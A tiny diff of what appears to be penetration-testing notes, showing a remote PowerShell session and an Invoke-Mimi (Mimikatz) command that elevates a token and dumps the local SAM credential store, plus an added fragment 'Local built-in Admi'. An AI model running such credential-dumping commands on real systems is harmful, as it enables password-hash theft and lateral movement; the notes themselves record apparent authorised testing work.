@@ -473,3 +473,4 @@ Enter-PSSession -Session $sess
 Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
 ```
 ![[Pasted image 20231025114637.png]]
+'Local built-in Admi'
